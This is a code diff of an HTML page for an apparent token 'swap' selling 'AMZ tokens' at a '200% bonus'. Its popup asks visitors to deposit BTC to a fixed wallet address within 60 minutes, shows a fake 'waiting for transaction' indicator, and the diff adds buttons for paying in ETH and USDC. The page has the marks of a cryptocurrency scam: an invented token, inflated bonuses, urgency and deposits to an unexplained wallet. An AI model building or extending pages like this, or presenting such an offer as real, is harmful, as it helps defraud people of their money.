@@ -42,19 +42,20 @@
 			      	<option value="0.20 BTC">0.20 BTC - 12000 AMZ (Bonus 200%)</option>
             </select>
             <span class="note"> Choose AMZ tokens quantity </span>
-          
+
             <button type="submit" class="card-btn" onclick="openPopupbtc()"> Swap to AMZ</button>
+            <button type="submit" class="coin-btn" onClick="location.href='eth.htm'"> Buy with ETH</button>
+            <button type="submit" class="coin-btn" onClick="location.href='usdc.htm'"> Buy with USDC</button>
             <p class="card-plan"></p>
             <div class="popupbtc" id="popupbtc">
               <img style="margin-top: 20px; width:42px; left: auto;" src="assets/img/shib.png">
-              <h3 style=margin-top:5px;">SWAP LAUNCHED</h3>
-              <p style="margin: 10px 15px 10px 15px;">Deposit your choosen amount in BTC by using the QR code or click on the BTC address below to copy and paste the wallet address.You have 60 min. to complete transaction.</p>
-              <img style="width:200px; margin: 0;" src="./assets/img/chart1.png">
+              <h3 style="margin-top: 5px;">SWAP LAUNCHED</h3>
+              <p style="margin: 10px 15px 10px 15px;">Deposit your chosen amount in BTC by using the QR code or click on the BTC address below to copy and paste the wallet address.You have 60 min. to complete transaction.</p>
+              <img style="width: 200px; margin: 0;" src="./assets/img/chart1.png">
               <br><br>
               <button class="popupcopy" onclick="copyText()">bc1qhelgmfcelm6sxw0fskm2ahhcaf970rk4p9l0xz</button>
               <button class="card-btn" onclick="copyText()">COPY ADDRESS</button>
               <span style="font-family:Heebo;color:#fff;"><i class="loading loading--full-height"></i> Waiting for transaction...</span>
-
               <script>
                 function copyText() {
               
@@ -63,6 +64,7 @@
                         ("bc1qhelgmfcelm6sxw0fskm2ahhcaf970rk4p9l0xz")
                 }
             </script>
+
             
             </div>
           </div>
